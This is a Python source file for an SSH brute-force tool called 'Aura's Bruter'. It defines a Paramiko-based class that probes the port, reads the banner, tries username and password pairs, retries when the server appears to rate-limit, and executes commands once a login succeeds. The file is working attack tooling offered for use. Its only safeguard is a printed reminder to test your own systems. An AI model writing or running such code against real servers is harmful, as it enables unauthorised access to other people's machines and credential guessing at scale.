#!/usr/bin/env python3
"""
Aura's Bruter - SSH Attack Module
High-performance SSH brute force using Paramiko
"""

import socket
import paramiko
from typing import Optional, Tuple
from dataclasses import dataclass
import logging

# Suppress Paramiko logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)


@dataclass
class SSHResult:
    """Result of an SSH connection attempt."""
    success: bool
    username: str
    password: str
    error: Optional[str] = None
    banner: Optional[str] = None


class SSHAttacker:
    """
    SSH brute force attack module using Paramiko.
    """
    
    def __init__(
        self,
        host: str,
        port: int = 22,
        timeout: float = 10.0,
        max_retries: int = 3
    ):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.max_retries = max_retries
        self._banner = None
    
    def check_port_open(self) -> bool:
        """Check if the SSH port is open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def get_banner(self) -> Optional[str]:
        """Get the SSH server banner."""
        if self._banner:
            return self._banner
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            self._banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return self._banner
        except Exception:
            return None
    
    def try_credentials(self, username: str, password: str) -> SSHResult:
        """
        Try to authenticate with the given credentials.
        
        Args:
            username: SSH username
            password: SSH password
            
        Returns:
            SSHResult with success status and details
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        for attempt in range(self.max_retries):
            try:
                client.connect(
                    hostname=self.host,
                    port=self.port,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False,
                    banner_timeout=self.timeout
                )
                
                # Success!
                client.close()
                return SSHResult(
                    success=True,
                    username=username,
                    password=password,
                    banner=self._banner
                )
                
            except paramiko.AuthenticationException:
                # Invalid credentials - don't retry
                return SSHResult(
                    success=False,
                    username=username,
                    password=password,
                    error="Authentication failed"
                )
                
            except paramiko.SSHException as e:
                error_msg = str(e)
                if "Error reading SSH protocol banner" in error_msg:
                    # Server might be rate limiting
                    if attempt < self.max_retries - 1:
                        continue
                return SSHResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"SSH error: {error_msg}"
                )
                
            except socket.timeout:
                if attempt < self.max_retries - 1:
                    continue
                return SSHResult(
                    success=False,
                    username=username,
                    password=password,
                    error="Connection timeout"
                )
                
            except socket.error as e:
                if attempt < self.max_retries - 1:
                    continue
                return SSHResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Socket error: {e}"
                )
                
            except Exception as e:
                return SSHResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Unexpected error: {e}"
                )
            
            finally:
                try:
                    client.close()
                except Exception:
                    pass
        
        return SSHResult(
            success=False,
            username=username,
            password=password,
            error="Max retries exceeded"
        )
    
    def execute_command(self, username: str, password: str, command: str) -> Optional[str]:
        """
        Execute a command after successful authentication.
        
        Returns:
            Command output or None if failed
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(
                hostname=self.host,
                port=self.port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )
            
            stdin, stdout, stderr = client.exec_command(command, timeout=self.timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            client.close()
            return output
            
        except Exception:
            return None
        finally:
            try:
                client.close()
            except Exception:
                pass
    
    def get_server_info(self) -> dict:
        """Get information about the SSH server."""
        return {
            "host": self.host,
            "port": self.port,
            "banner": self.get_banner(),
            "port_open": self.check_port_open()
        }


if __name__ == "__main__":
    # Demo
    from rich.console import Console
    from rich.table import Table
    
    console = Console()
    
    # Example usage (don't actually run against real targets!)
    console.print("[yellow]SSH Attack Module - Demo Mode[/yellow]")
    console.print("[dim]This is for testing your own systems only![/dim]")
    
    table = Table(title="SSHAttacker Methods")
    table.add_column("Method", style="cyan")
    table.add_column("Description", style="white")
    
    table.add_row("check_port_open()", "Check if SSH port is accessible")
    table.add_row("get_banner()", "Retrieve SSH server banner")
    table.add_row("try_credentials(user, pass)", "Attempt authentication")
    table.add_row("execute_command(user, pass, cmd)", "Run command after auth")
    table.add_row("get_server_info()", "Get comprehensive server info")
    
    console.print(table)
